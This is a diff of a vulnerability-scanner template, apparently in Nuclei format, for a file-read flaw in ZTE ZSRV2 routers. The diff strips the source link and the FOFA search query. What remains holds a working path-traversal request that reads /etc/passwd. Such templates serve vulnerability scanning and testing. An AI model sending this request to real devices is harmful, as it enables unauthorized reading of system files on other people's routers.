@@ -3,12 +3,8 @@ info:
   name: 中兴 ZSRV2路由器 文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fihikcdfsl3xd9sw'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fihikcdfsl3xd9sw
-    fofa: title = ZSRV2路由器Web管理系统
 http:
 - raw:
   - 'GET /css//../../../../../../../../etc/passwd HTTP/1.1
